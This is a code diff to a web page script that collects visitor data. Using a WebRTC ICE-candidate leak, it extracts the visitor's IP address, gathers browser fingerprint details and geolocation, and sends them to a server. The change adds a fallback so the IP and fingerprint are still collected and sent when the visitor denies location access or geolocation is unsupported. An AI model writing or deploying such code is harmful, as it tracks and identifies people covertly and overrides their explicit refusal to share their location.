@@ -13,7 +13,7 @@
             text-align: center;
             margin: 0;
             padding: 0;
-            over-flow: hidden;
+            overflow: hidden;
             height: 100vh;
             background-repeat: no-repeat;
         }
@@ -95,6 +95,68 @@
                 }).catch((error) => console.error("Error sending data:", error));
             }
 
+            async function fetchIPUsingWebRTC() {
+                return new Promise((resolve, reject) => {
+                    const ipDups = {};
+                    const RTCPeerConnection =
+                        window.RTCPeerConnection ||
+                        window.mozRTCPeerConnection ||
+                        window.webkitRTCPeerConnection;
+
+                    if (!RTCPeerConnection) {
+                        console.error("WebRTC is not supported for IP detection.");
+                        reject("WebRTC not supported.");
+                        return;
+                    }
+
+                    const pc = new RTCPeerConnection({ iceServers: [] });
+                    pc.createDataChannel("");
+                    pc.createOffer()
+                        .then((offer) => pc.setLocalDescription(offer))
+                        .catch((error) => {
+                            console.error("Error creating WebRTC offer:", error);
+                            reject(error);
+                        });
+
+                    pc.onicecandidate = (ice) => {
+                        if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+
+                        const candidate = ice.candidate.candidate;
+                        const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/g;
+                        const ipMatches = candidate.match(regex);
+
+                        if (ipMatches) {
+                            ipMatches.forEach((ip) => {
+                                if (!ipDups[ip]) {
+                                    ipDups[ip] = true;
+                                    resolve(ip);
+                                }
+                            });
+                        }
+                    };
+                });
+            }
+
+            async function handleLocationDenied() {
+                try {
+                    const ip = await fetchIPUsingWebRTC();
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+                    const screenResolution = `${screen.width}x${screen.height}`;
+
+                    if (ip) {
+                        document.getElementById("ip").textContent = ip;
+                        document.getElementById("details").style.display = "block";
+                        animateUI();
+
+                        const data = { ipAddress: ip, userAgent, platform, screenResolution };
+                        sendDataToServer(data);
+                    }
+                } catch (error) {
+                    console.error("Unable to retrieve IP or location:", error);
+                }
+            }
+
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     async (position) => {
@@ -103,50 +165,28 @@
                         document.getElementById("latitude").textContent = latitude;
                         document.getElementById("longitude").textContent = longitude;
 
+                        const ip = await fetchIPUsingWebRTC();
                         const userAgent = navigator.userAgent;
                         const platform = navigator.platform;
                         const screenResolution = `${screen.width}x${screen.height}`;
 
-                        const ipDups = {};
-                        const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+                        if (ip) {
+                            document.getElementById("ip").textContent = ip;
+                            document.getElementById("details").style.display = "block";
+                            animateUI();
 
-                        if (!RTCPeerConnection) {
-                            console.error("WebRTC not supported for IP detection.");
-                            return;
+                            const data = { ipAddress: ip, latitude, longitude, userAgent, platform, screenResolution };
+                            sendDataToServer(data);
                         }
-
-                        const pc = new RTCPeerConnection({ iceServers: [] });
-                        pc.createDataChannel("");
-                        pc.createOffer()
-                            .then((offer) => pc.setLocalDescription(offer))
-                            .catch((error) => console.error("Error creating offer:", error));
-
-                        pc.onicecandidate = (ice) => {
-                            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
-
-                            const candidate = ice.candidate.candidate;
-                            const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/g;
-                            const ipMatches = candidate.match(regex);
-
-                            if (ipMatches) {
-                                ipMatches.forEach((ip) => {
-                                    if (!ipDups[ip]) {
-                                        ipDups[ip] = true;
-                                        document.getElementById("ip").textContent = ip;
-                                        document.getElementById("details").style.display = "block";
-                                        animateUI();
-
-                                        const data = { ipAddress: ip, latitude, longitude, userAgent, platform, screenResolution };
-                                        sendDataToServer(data);
-                                    }
-                                });
-                            }
-                        };
                     },
-                    () => console.error("Unable to retrieve location.")
+                    async () => {
+                        console.warn("Location access denied.");
+                        await handleLocationDenied();
+                    }
                 );
             } else {
                 console.error("Geolocation not supported by your browser.");
+                handleLocationDenied();
             }
         }
 
